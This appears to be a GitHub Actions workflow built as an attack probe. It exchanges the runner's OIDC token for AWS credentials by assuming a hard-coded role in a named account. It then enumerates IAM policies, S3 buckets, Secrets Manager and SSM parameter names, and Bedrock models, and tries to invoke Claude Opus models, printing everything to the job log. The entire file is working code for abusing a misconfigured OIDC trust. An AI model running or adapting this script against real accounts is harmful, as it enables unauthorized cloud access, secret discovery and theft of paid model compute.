name: oidc-probe-ghi1
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - name: probe
        shell: bash
        run: |
          set +e
          TOK=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
          echo "TOKLEN=${#TOK}"
          echo "SUB=$(echo $TOK | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 400)"
          probe() {
            ROLE="$1"
            echo "=== ROLE $ROLE"
            RESP=$(curl -s --max-time 25 "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=${ROLE}&RoleSessionName=probe&WebIdentityToken=${TOK}&DurationSeconds=3600")
            AK=$(printf '%s' "$RESP" | grep -oP '(?<=<AccessKeyId>)[^<]+' | head -1)
            if [ -z "$AK" ]; then
              ERR=$(printf '%s' "$RESP" | tr -d '\n' | grep -oP '(?<=<Code>)[^<]+' | head -1)
              MSG=$(printf '%s' "$RESP" | tr -d '\n' | grep -oP '(?<=<Message>)[^<]+' | head -1 | head -c 240)
              echo "FAIL $ROLE :: $ERR :: $MSG"
              return
            fi
            ST=$(printf '%s' "$RESP" | grep -oP '(?<=<SessionToken>)[^<]+' | head -1)
            SK=$(printf '%s' "$RESP" | grep -oP '(?<=<SecretAccessKey>)[^<]+' | head -1)
            export AWS_ACCESS_KEY_ID="$AK" AWS_SECRET_ACCESS_KEY="$SK" AWS_SESSION_TOKEN="$ST" AWS_DEFAULT_REGION=us-east-1 AWS_PAGER=""
            IDENT=$(aws sts get-caller-identity --output json 2>&1 | tr -d '\n')
            echo "ASSUME_OK $ROLE :: $IDENT"
            RN=$(echo $ROLE | awk -F/ '{print $NF}')
            echo "-- ATTACHED $(aws iam list-attached-role-policies --role-name "$RN" --output text 2>&1 | tr '\n' ' ' | head -c 400)"
            echo "-- INLINE $(aws iam list-role-policies --role-name "$RN" --output text 2>&1 | tr '\n' ' ' | head -c 300)"
            echo "-- S3 $(aws s3 ls 2>&1 | tr '\n' ' ' | head -c 400)"
            echo "-- SM $(aws secretsmanager list-secrets --max-items 20 --query 'SecretList[].Name' --output text 2>&1 | tr '\n' ' ' | head -c 800)"
            echo "-- SSM $(aws ssm describe-parameters --max-items 20 --query 'Parameters[].Name' --output text 2>&1 | tr '\n' ' ' | head -c 500)"
            echo "-- BFM $(aws bedrock list-foundation-models --query 'modelSummaries[?contains(modelId,`claude`)].modelId' --output text 2>&1 | tr '\n' ' ' | head -c 300)"
            for REG in us-east-1 us-west-2; do
              for MID in "us.anthropic.claude-opus-5-5" "global.anthropic.claude-opus-5-5" "anthropic.claude-opus-5-5"; do
                OF="/tmp/o_$$_${RANDOM}.json"
                ERR=$(aws bedrock-runtime invoke-model --region $REG --model-id "$MID" --cli-binary-format raw-in-base64-out --body '{"messages":[{"role":"user","content":[{"text":"hi"}]}],"anthropic_version":"bedrock-2023-05-31","max_tokens":8}' "$OF" 2>&1)
                if [ -s "$OF" ]; then echo "OPUS_OK $REG $MID $ROLE :: $(head -c 200 "$OF")"; else echo "OPUS_ERR $REG $MID $ROLE :: $(printf '%s' "$ERR" | tr '\n' ' ' | head -c 240)"; fi
              done
            done
          }
          probe "arn:aws:iam::378464928598:role/github-oidc-role"
          echo "==DONE=="
